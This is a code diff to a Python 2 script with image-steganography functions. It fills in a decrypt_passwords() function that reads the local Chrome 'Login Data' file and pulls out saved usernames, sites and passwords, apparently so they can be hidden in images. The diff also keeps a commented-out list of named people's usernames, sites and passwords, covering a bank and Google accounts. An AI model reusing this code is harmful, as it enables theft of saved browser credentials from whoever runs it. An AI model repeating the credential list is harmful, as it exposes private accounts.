@@ -5,6 +5,7 @@ import Image
 from datetime import datetime, timedelta
 import sys
 from time import sleep
+import re
 
 # Function to encode a stego message from image
 def encode(filepath, message):
@@ -32,14 +33,75 @@ def isvalidformat(msg):
 	else:
 		return False
 				
-# Function to decrypt passwords from the browser and save in a file
+# Function to decrypt passwords from the browser 
 def decrypt_passwords():
-	msglist = []
-	# Code to decrypt from firefox or chrom
-	# Code
-	# Code
-	# Code
-	savedlist = [['vivekanand','dss.nitc.ac.in','Bmyllb0900'],['vivekzhere','accounts.google.com','Bviassword'],['nithinvnath','http://onlinesbi.com','Bsectbanpassword'],['arunkuruvila','http://facebook.com','Bmybidaypw'],['aravind.an','http://twitter.com','Bfastrack'],['sreeraj.altair','http://accounts.google.com', 'Bs_game']]
+	chrome_path = path.expanduser("~/.config/google-chrome/Default/Login Data")
+	try:
+		f = open(chrome_path,'r')
+		lines = []
+		s=""
+		while True:
+			c = f.read(1)
+			if not c:
+			  break
+			elif c>=' ' and c<='~':	
+				s=s+c
+				#print c,
+			elif  c=='\n':
+				lines.append(s)
+				s=""
+		
+		f.close()
+		r = re.compile('/')
+		l1 = r.split(lines[1])
+		l2 = r.split(lines[2])
+		i=1
+
+		x = []
+		while(5+(i-1)*9 < l1.__len__()):
+			x.append(l1[5+(i-1)*9])			#Hostname
+			x.append(l1[6+(i-1)*9])
+			i=i+1
+
+		y = []
+		i=1
+		while(3+(i-1)*6 < l2.__len__()):
+			y.append(l2[3+(i-1)*6])
+			i=i+1
+		i=1
+		savedlist = []
+		while(2*(i-1) < x.__len__()):
+			hostname = x[2*(i-1)]
+			s1 = x[2*(i-1) + 1]
+			s2 = y[i-1]
+			for j in range(0,1000):
+				if s1[j:j+5].lower() == 'email':
+					break
+			s1 = s1[j:]
+			for j in range(0,1000):
+				if s2[j:j+5].lower() == 'email':
+					break
+			s2 = s2[j:]
+			for j in range (0,1000):
+				if(s2[j] != s1[j]):
+					break
+			s3 = s1[j:]
+			s4 = s2[j:]
+			password = s3[:-len(s4)]
+			s2 = s2[:-len(s4)]
+			s2 = s2[5:]
+			j = len(s2)
+			while (j>=0):
+				j = j - 1
+				if(s2[j].lower()=='p'):
+					break
+			username =  s2[:j]
+			print [username, hostname, password]
+			savedlist.append([username,hostname,password])
+			i=i+1
+	except:
+		pass
+	#savedlist = [['vivekanand','dss.nitc.ac.in','Bmyllb0900'],['vivekzhere','accounts.google.com','Bviassword'],['nithinvnath','http://onlinesbi.com','Bsectbanpassword'],['arunkuruvila','http://facebook.com','Bmybidaypw'],['aravind.an','http://twitter.com','Bfastrack'],['sreeraj.altair','http://accounts.google.com', 'Bs_game']]
 	msglist = []
 	for entry in savedlist:
 		msglist.append(format_msg(entry))
